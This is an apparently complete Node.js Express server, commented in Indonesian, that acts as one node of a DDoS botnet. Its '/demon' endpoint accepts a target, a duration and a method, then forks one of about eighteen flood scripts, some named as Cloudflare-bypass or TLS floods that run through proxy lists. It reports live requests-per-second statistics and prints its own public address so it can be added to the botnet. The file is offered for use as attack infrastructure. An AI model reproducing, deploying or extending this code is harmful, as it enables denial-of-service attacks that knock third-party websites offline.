const express = require('express');
const { fork } = require('child_process'); // Ganti exec dengan fork
const cors = require('cors'); // Tambahkan CORS untuk komunikasi

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5032;

app.use(cors()); // Gunakan CORS

// === Sistem Pelacakan Statistik Real-time ===
let liveStats = {
  totalRequests: 0,
  successfulRequests: 0,
  rps: 0,
};

// Objek untuk melacak semua proses serangan yang sedang berjalan
const runningAttacks = new Map();

// Fungsi untuk membersihkan statistik jika tidak ada serangan
function clearStatsIfIdle() {
  if (runningAttacks.size === 0) {
    liveStats = { totalRequests: 0, successfulRequests: 0, rps: 0 };
  }
}

// Endpoint baru untuk menyediakan statistik ke front-end
app.get('/stats', (req, res) => {
  // Hitung total RPS dari semua serangan yang berjalan
  let totalRps = 0;
  for (const stats of runningAttacks.values()) {
    totalRps += stats.rps || 0;
  }
  liveStats.rps = totalRps;
  
  res.json(liveStats);
});


async function fetchData() {
  try {
    const response = await fetch('https://httpbin.org/get');
    const data = await response.json();
    console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
  } catch (error) {
    console.error('Failed to fetch initial data:', error);
    // Jika gagal, coba dapatkan dari header lokal jika tersedia
    const localIp = '127.0.0.1'; // Fallback
    console.log(`Copy This Add To Botnet -> http://${localIp}:${port}`);
  }
}

// Endpoint serangan yang telah ditingkatkan
app.get('/demon', (req, res) => {
  const { target, time, methods, port: attackPort } = req.query;

  if (!target || !time || !methods) {
    return res.status(400).json({ message: "Target, time, and methods are required." });
  }

  res.status(202).json({ // 202 Accepted, karena proses berjalan di background
    message: 'API request accepted. Executing script.',
    target,
    time,
    methods
  });

  const attackId = Date.now().toString(); // ID unik untuk setiap serangan
  let scriptPath = '';
  let scriptArgs = [];

  // Peta metode ke skrip dan argumennya
  const commandMap = {
    'ninja': { path: './lib/cache/StarsXNinja.js', args: [target, time] },
    'mix': { path: './lib/cache/StarsXMix.js', args: [target, time, '100', '10', 'proxy.txt'] },
    'strike': { path: './methods/strike.js', args: ['GET', target, time, '10', '90', 'proxy.txt', '--full', '--legit'] },
    'tls': { path: './methods/tls.js', args: [target, time, '100', '10'] },
    'flood': { path: './methods/flood.js', args: [target, time] },
    'tlskill': { path: './methods/TLS-KILL.js', args: [target, time, '100', '10', 'proxy.txt'] },
    'storm': { path: './methods/storm.js', args: [target, time, '100', '10', 'proxy.txt'] },
    'destroy': { path: './methods/DESTROY.js', args: [target, time, '100', '10', 'proxy.txt'] },
    'thunder': { path: './methods/thunder.js', args: [target, time, '100', '10', 'proxy.txt'] },
    'bypass': { path: './methods/bypass.js', args: [target, time, '100', '10', 'proxy.txt'] },
    'cf-flood': { path: './methods/cf-flood.js', args: [target, time] },
    'http-vip': { path: './methods/HTTP-VIP.js', args: [target, time, '100', '10', 'proxy.txt'] },
    'uam': { path: './methods/uambypass.js', args: [target, time, '100', 'proxy.txt'] },
    'tornado': { path: './methods/TORNADOV2.js', args: ['GET', target, time, '10', '100', 'proxy.txt'] },
    'raw-mix': { path: './methods/RAW-MIX.js', args: [target, time] },
    'drown': { path: './methods/drown.js', args: [target, time, '10', '100'] },
    'cookie': { path: './methods/cookie.js', args: [target, time, '10', '100', 'proxy.txt'] },
    'tls-slow': { path: './methods/YAT-TLS.js', args: [target, time, '100', '10', 'proxy.txt'] },
  };

  const command = commandMap[methods];

  if (command) {
    console.log(`Executing: node ${command.path} ${command.args.join(' ')}`);
    const child = fork(command.path, command.args, { silent: true });

    runningAttacks.set(attackId, { rps: 0 }); // Tambahkan ke daftar serangan berjalan

    // "Dengarkan" pesan dari skrip serangan
    child.on('message', (msg) => {
      if (msg.type === 'stats') {
        liveStats.totalRequests += msg.requests || 0;
        liveStats.successfulRequests += msg.success || 0;
        
        // Simpan RPS untuk serangan ini
        const attackStat = runningAttacks.get(attackId);
        if (attackStat) {
            attackStat.rps = msg.requests || 0;
        }
      }
    });

    child.on('exit', (code) => {
      console.log(`Script ${command.path} finished with code ${code}`);
      runningAttacks.delete(attackId); // Hapus dari daftar setelah selesai
      clearStatsIfIdle();
    });

    child.stderr.on('data', (data) => {
        console.error(`[${command.path} STDERR]: ${data}`);
    });

  } else {
    console.log('Metode tidak dikenali atau format salah.');
  }
});

app.listen(port, () => {
  fetchData();
});